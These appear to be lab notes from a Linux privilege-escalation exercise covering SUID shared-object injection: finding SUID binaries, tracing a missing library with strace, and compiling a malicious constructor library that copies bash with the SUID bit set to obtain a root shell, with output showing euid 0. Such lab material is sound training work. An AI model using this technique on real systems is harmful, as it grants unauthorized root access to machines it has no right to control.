

## Detecting it 


```
find / -perm -u=s -type f -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```



```
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```


```
TCM@debian:~$ cat error.txt | awk -F'"' '{print $2}'
/etc/suid-debug
/etc/ld.so.nohwcap
/etc/ld.so.preload
/etc/ld.so.cache
/etc/ld.so.nohwcap
/lib/libdl.so.2
/etc/ld.so.nohwcap
/usr/lib/libstdc++.so.6
/etc/ld.so.nohwcap
/lib/libm.so.6
/etc/ld.so.nohwcap
/lib/libgcc_s.so.1
/etc/ld.so.nohwcap
/lib/libc.so.6
/home/user/.config/libcalc.so 
```


```
bash-4.1# ls -ld /home/user/.config/libcalc.so 
-rwxr-xr-x 1 TCM user 6042 Mar  2 10:54 /home/user/.config/libcalc.so
we have WRITE PERMISSIONS!!!
```

## Exploit

```
mkdir /home/user/.config
cd /home/user/.config
nano libcalc.c
```


```C
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```


and then to compile and execute

```bash
TCM@debian:~$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~$ 
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),2
9(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```


